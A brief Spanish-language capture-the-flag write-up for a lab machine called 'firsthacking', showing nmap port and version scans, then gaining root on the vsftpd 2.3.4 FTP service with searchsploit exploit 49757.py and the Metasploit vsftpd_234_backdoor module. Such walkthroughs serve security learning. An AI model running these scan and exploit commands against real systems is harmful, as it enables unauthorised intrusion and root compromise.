### maquina firsthacking

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

21/tcp open  ftp     syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p21 -vvv -Pn 172.17.0.2

21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4

## Intrusion

buscamos en searchploit

![alt text](image-9.png)


descargamos el exploit

searchsploit -m unix/remote/49757.py

ejecutamos 2 veces el exploit para que funcione

python3 49757.py 172.17.0.2

accedimos como root

![alt text](image-10.png)


# Metasploit

usamos el exploit exploit/unix/ftp/vsftpd_234_backdoor

configuramos el exploit

set RHOSTS 172.17.0.2

run 

listo somos root

![alt text](image-11.png)




